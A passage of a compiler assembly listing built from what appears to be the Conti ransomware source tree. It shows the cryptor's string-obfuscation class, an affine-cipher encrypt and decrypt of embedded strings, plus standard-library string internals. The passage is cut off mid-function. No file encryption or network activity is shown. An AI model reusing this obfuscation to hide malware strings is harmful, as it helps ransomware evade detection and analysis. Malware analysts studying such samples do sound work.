	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00036	48 8b c8	 mov	 rcx, rax
  00039	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  0003e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00045	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
_Val1$ = 240
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >, COMDAT

; 1528 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00009	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000e	55		 push	 rbp
  0000f	57		 push	 rdi
  00010	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00017	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00023	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00028	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002f	48 8b c8	 mov	 rcx, rax
  00032	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  00037	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00045	5f		 pop	 rdi
  00046	5d		 pop	 rbp
  00047	c3		 ret	 0
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 13	 sub	 eax, 19
  0002d	6b c0 37	 imul	 eax, eax, 55		; 00000037H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 61	 imul	 eax, eax, 97		; 00000061H
  0002d	83 c0 13	 add	 eax, 19
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 1a	 cmp	 QWORD PTR i$1[rbp], 26
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv280 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
